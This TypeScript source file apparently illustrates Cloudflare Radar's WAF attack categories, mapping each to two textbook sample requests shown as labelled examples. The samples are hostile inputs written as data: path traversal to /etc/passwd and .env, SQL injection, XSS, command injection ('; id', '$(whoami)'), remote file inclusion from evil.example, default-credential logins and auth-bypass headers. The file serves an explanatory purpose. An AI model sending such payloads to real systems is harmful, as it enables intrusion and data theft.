/**
 * Example requests for the WAF managed-rule categories Cloudflare Radar
 * reports (`summary/MANAGED_RULES`). Radar publishes the categories and their
 * shares, never the requests themselves, so these are textbook samples of
 * each category, the kind found in any WAF or OWASP primer, shown on the
 * globe as illustrations and labelled as examples in the caption. Hosts use
 * the reserved `.example` domain.
 */
const EXAMPLES: Record<string, string[]> = {
  "Directory Traversal": ["GET /../../etc/passwd", "GET /static/..%2f..%2f.env"],
  "HTTP Anomaly": ["GET /%%%% HTTP/1.1", "Content-Length: -1"],
  SQLi: ["?id=1' OR '1'='1", "UNION SELECT user, pass FROM users"],
  XSS: ["<script>alert(1)</script>", '"><img src=x onerror=alert(1)>'],
  "Command Injection": ["?host=8.8.8.8; id", "?q=$(whoami)"],
  "File Inclusion": ["?page=/proc/self/environ", "?page=http://evil.example/x.txt"],
  "Broken Authentication": ["POST /login admin:admin", "POST /login root:123456"],
  "Vulnerability scanner": ["GET /.env", "GET /wp-admin/setup-config.php"],
  "Auth Bypass": ["X-Original-URL: /admin", "GET /admin;/"],
};

/** Samples for the given categories, in their order (two each), or for the commonest categories when none is known. */
export function examplePayloads(categories: string[]): string[] {
  const known = categories.filter((c) => EXAMPLES[c]);
  const use = known.length ? known : ["Directory Traversal", "Vulnerability scanner"];
  // interleave, so the first two shown come from different categories
  const lists = use.map((c) => EXAMPLES[c]!);
  const out: string[] = [];
  for (let i = 0; i < 2; i++) for (const l of lists) if (l[i]) out.push(l[i]!);
  return out;
}
